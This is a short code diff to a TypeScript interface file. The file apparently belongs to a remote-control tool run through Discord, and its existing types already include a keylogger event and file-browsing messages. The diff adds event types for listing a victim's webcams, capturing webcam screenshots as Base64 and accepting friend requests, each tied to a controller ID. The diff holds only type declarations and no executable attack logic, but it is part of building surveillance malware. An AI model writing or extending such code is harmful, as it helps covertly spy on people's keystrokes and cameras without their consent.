@@ -1,3 +1,4 @@
+import { type Base64String } from "discord.js";
 import { type Process, type DirEntry } from "./ws.types";
 
 export interface GetFilesFolder {
@@ -61,4 +62,25 @@ export interface KeyLoggerEvent {
 	keys: string[];
 
 	controllerid: string;
+}
+
+export interface AddFriendEvent {
+	accept: boolean;
+	controllerid: string;
+	clientid: string;
+}
+
+export interface GetWebcamsEvent {
+	messageid: string
+
+	controllerid: string;
+	webcams: Array<{
+		id: string;
+		name: string;
+	}>;
+}
+
+export interface GetWebcamScreenshotEvent {
+	controllerid: string;
+	screenshot: Base64String;
 }
